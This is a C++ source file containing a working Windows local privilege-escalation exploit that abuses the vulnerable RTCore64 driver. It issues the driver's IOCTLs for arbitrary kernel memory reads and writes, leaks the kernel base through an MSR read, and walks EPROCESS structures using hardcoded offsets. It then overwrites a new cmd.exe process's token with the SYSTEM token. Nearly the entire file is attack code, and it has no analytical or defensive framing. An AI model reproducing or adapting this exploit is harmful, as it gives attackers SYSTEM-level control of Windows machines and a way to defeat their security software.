// IOCTL-Client.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <string.h>

#define IOCTL_MAP_SECTION CTL_CODE(0x8000,0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNMAP_SECTION CTL_CODE(0x8000,0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_IN_BYTE CTL_CODE(0x8000,0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_IN_WORD CTL_CODE(0x8000,0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_IN_DWORD CTL_CODE(0x8000,0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OUT_DATA_BYTE CTL_CODE(0x8000,0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OUT_DATA_WORD CTL_CODE(0x8000,0x806, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OUT_DATA_DWORD CTL_CODE(0x8000,0x807, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_OVERWRITE_PTR CTL_CODE(0x8000,0x80c, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_READ_DATA_AND_UPDATE_GLOBAL_VAR CTL_CODE(0x8000,0x80b,METHOD_BUFFERED,FILE_ANY_ACCESS)
#define IOCTL_READ_MSR CTL_CODE(0x8000,0x80c, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_MSR CTL_CODE(0x8000, 0x80d, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_MAP_IOSPACE CTL_CODE(0x8000,0x810, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNMAP_IOSPACE CTL_CODE(0x8000,0x811, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_READ_DATA CTL_CODE(0x8000,0x812, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_DATA CTL_CODE(0x8000,0x813, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_BUSDATA CTL_CODE(0x8000,0x814, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_SET_BUSDATA CTL_CODE(0x8000,0x815,METHOD_BUFFERED, FILE_ANY_ACCESS)

struct token_addrs {
	unsigned long long system_token;
	unsigned long long pid_token;
};

unsigned int write_data(HANDLE device, unsigned long long addr, unsigned int val) {
	struct input_data {
		char a[8];						// +8
		unsigned long long v7;			// +16
		int x;							// +20
		int offset;						// +24
		int switch_case;				// +28
		unsigned int val;				// +32
		unsigned long long x1;			// +40
		unsigned long long x2;			// +48
	};

	struct output_data {
		char a[28];
		unsigned int leaked_data;
		char b[12];
	};

	DWORD bytesReturned = 0;

	input_data* input_buffer = (input_data*)malloc(sizeof(input_data));
	output_data* output_buffer = (output_data*)malloc(sizeof(output_data));
	memset(input_buffer, 0, sizeof(input_data));
	memset(output_buffer, 0, sizeof(output_data));

	input_buffer->v7 = addr - 1;
	input_buffer->offset = 1;
	input_buffer->val = val;
	input_buffer->switch_case = 4;

	BOOL status = DeviceIoControl(device, IOCTL_WRITE_DATA, input_buffer, sizeof(input_data), output_buffer, sizeof(output_data), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == 0x00) {
		printf_s("[-] Unable to issue IOCTL code to driver. Recived error code: 0x%x\n", GetLastError());
		return 0;
	}

	return 1;
}

unsigned int read_data(HANDLE device, unsigned long long addr) {
	struct input_data {
		char a[8];						// +8
		unsigned long long v6;			// +16
		char b[4];						// +20
		int offset;						// +24
		int switch_case;				// +28
		unsigned long long output_addr;	// +36
		int y;							// +40
	};

	struct output_data {
		char a[28];
		unsigned int leaked_data;
		char b[12];
	};

	DWORD bytesReturned = 0;

	input_data* input_buffer = (input_data*)malloc(sizeof(input_data));
	output_data* output_buffer = (output_data*)malloc(sizeof(output_data));
	memset(input_buffer, 0, sizeof(input_data));
	memset(output_buffer, 0, sizeof(output_data));

	input_buffer->v6 = addr - 1;
	input_buffer->offset = 1;
	input_buffer->switch_case = 4;

	BOOL status = DeviceIoControl(device, IOCTL_READ_DATA, input_buffer, sizeof(input_data), output_buffer, sizeof(output_data), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == 0x00) {
		printf_s("[-] Unable to issue IOCTL code to driver. Recived error code: 0x%x\n", GetLastError());
		return 0;
	}

	return output_buffer->leaked_data;
}

unsigned long long get_address_value(HANDLE device, unsigned long long addr) {
	unsigned long data1 = read_data(device, addr);
	unsigned long data2 = read_data(device, addr + 4);
	unsigned long long ptr_addr = ((static_cast<unsigned long long>(data2)) << 32) | data1;
	return ptr_addr;
}

int write_address_value(HANDLE device, unsigned long long src, unsigned long long dst) {
	//	write_data(device, src, static_cast<unsigned int>(dst >> 32));
	write_data(device, src, dst & 0x00000000ffffffff);
	return 1;
}

int CreateProc() {

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	// CreateProcess parameters
	LPCTSTR lpApplicationName = L"C:\\Windows\\System32\\cmd.exe";
	LPTSTR lpCommandLine = NULL;
	LPSECURITY_ATTRIBUTES lpProcessAttributes = NULL;
	LPSECURITY_ATTRIBUTES lpThreadAttributes = NULL;
	BOOL bInheritHandles = FALSE;
	DWORD dwCreationFlags = CREATE_NEW_CONSOLE; // Use this flag to create a new console window
	LPVOID lpEnvironment = NULL;
	LPCTSTR lpCurrentDirectory = NULL;
	LPSTARTUPINFO lpStartupInfo = &si;
	LPPROCESS_INFORMATION lpProcessInformation = &pi;

	// Create the new process
	if (!CreateProcess(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)) {
		// Failed to create process
		DWORD error = GetLastError();
		printf("Failed to create process. Error code: %d\n", error);
	}

	int pid = pi.dwProcessId;
	return pid;
}

unsigned long long read_msr(HANDLE device) {

	struct MSR_OUTPUT_DATA {
		unsigned int msr_register;
		unsigned int upper_dword;
		unsigned int lower_dword;
	};

	DWORD bytesReturned = 0;

	char InputBuffer[] = { '\x82','\x00','\x00','\xC0','C','C','C','C','A','A','A','A' };
	MSR_OUTPUT_DATA* outputBuffer = (MSR_OUTPUT_DATA*)malloc(sizeof(MSR_OUTPUT_DATA));
	unsigned long long kernel_ptr = NULL;
	if (outputBuffer == NULL) {
		printf_s("[-] Memory not avaiable to create outputBuffer\n");
		return 0;
	}
	memset(outputBuffer, 0, sizeof(outputBuffer));
	printf_s("[+] Issuing IOCTL code: 0x%x with input size as: %d and input as:", IOCTL_READ_MSR, sizeof(InputBuffer));
	for (int i = 0; i < sizeof(InputBuffer); i++) {
		printf_s("\\x%02x", InputBuffer[i] & 0xff);
	}
	printf_s("\n");

	BOOL status = DeviceIoControl(device, IOCTL_READ_MSR, InputBuffer, sizeof(InputBuffer), outputBuffer, sizeof(outputBuffer), &bytesReturned, (LPOVERLAPPED)NULL);
	if (status == 0x00) {
		printf_s("[-] Unable to issue IOCTL code to driver. Recived error code: 0x%x\n", GetLastError());
		return 0;
	}

	printf_s("[+] Total data recieved from kernel: %d\n", bytesReturned);
	kernel_ptr = (static_cast<unsigned long long>(outputBuffer->upper_dword)) << 32 | (outputBuffer->lower_dword);
	printf_s("[+] Kernel Pointer leaked: 0x%llx\n", kernel_ptr);
	return kernel_ptr - 0xa1a180;
}

token_addrs* traverse_linked_list(unsigned long int target_pid, unsigned long long eprocess_addr, HANDLE device) {
	unsigned long long eprocess = NULL;
	unsigned long long ActiveLinkedList = NULL;
	unsigned long long ProcessPid = NULL;
	unsigned long int pid = 0;
	unsigned long int max_counter = 0;
	unsigned long long system_eprocess = NULL;

	token_addrs* token = (token_addrs*)malloc(sizeof(token_addrs));
	memset(token, 0, sizeof(token));

	while (1) {
		eprocess = eprocess_addr;
		ActiveLinkedList = eprocess + 0x448;
		ProcessPid = eprocess + 0x440;
		eprocess_addr = get_address_value(device, ActiveLinkedList) - 0x448;
		pid = read_data(device, ProcessPid);
		printf_s("[+] ......... Traversing through EPROCESS in kernel for pid: %d .........\n", pid);
		if (pid == 4) {
			system_eprocess = eprocess;
		}
		if (pid == target_pid)
			break;
		max_counter++;
		if (max_counter == 0xffffff) {
			printf_s("[-] ........ Stuck in Infinate Loop .........\n");
			break;
		}
	}

	if (max_counter == 0xffffff)
		return token;
	token->pid_token = eprocess + 0x4b8;
	token->system_token = system_eprocess + 0x4b8;
	return token;
}

int main(char argc, char** argv)
{

	token_addrs* token = (token_addrs*)malloc(sizeof(token_addrs));
	HANDLE device = INVALID_HANDLE_VALUE;
	BOOL status = FALSE;
	device = CreateFile(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (device == INVALID_HANDLE_VALUE) {
		printf_s("Cloud not open the driver: 0x%x\n", GetLastError());
		return -1;
	}
	unsigned long long kernel_ptr = read_msr(device);
	if (kernel_ptr == NULL) {
		printf_s("[-] Error fetching the base address of kernel\n");
		return -1;
	}
	printf_s("[+] Leaked kernel base address: 0x%llx\n", kernel_ptr);
	unsigned long long PsInitialSystemProcess = kernel_ptr + 0xcfc420;
	printf_s("[+] Address of PsInitialSystemProcess: %llx\n", PsInitialSystemProcess);
	unsigned long long pointer_PsInitialSystemProcess = get_address_value(device, PsInitialSystemProcess);

	printf_s("[+] Pointer to PsInitialSystemProcess: %llx\n", pointer_PsInitialSystemProcess);

	int pid = CreateProc();
	printf_s("[+] Created a new cmd.exe with pid: %d\n", pid);

	token = traverse_linked_list(pid, pointer_PsInitialSystemProcess, device);
	printf_s("[+] Address of PID: %d TOKEN structure: 0x%llx\n", pid, token->pid_token);
	printf_s("[+] Address of TOKEN structure of kernel: 0x%llx\n", token->system_token);

	unsigned long long ptr_system_token = get_address_value(device, token->system_token) & 0xfffffffffffffff0;
	printf_s("[+] Pointer to system Token: 0x%llx\n", ptr_system_token);

	printf_s("[+] Initiating token copy. The new cmd.exe window would now have system permissions.\n");
	write_address_value(device, token->pid_token, ptr_system_token);
	return 1;
}
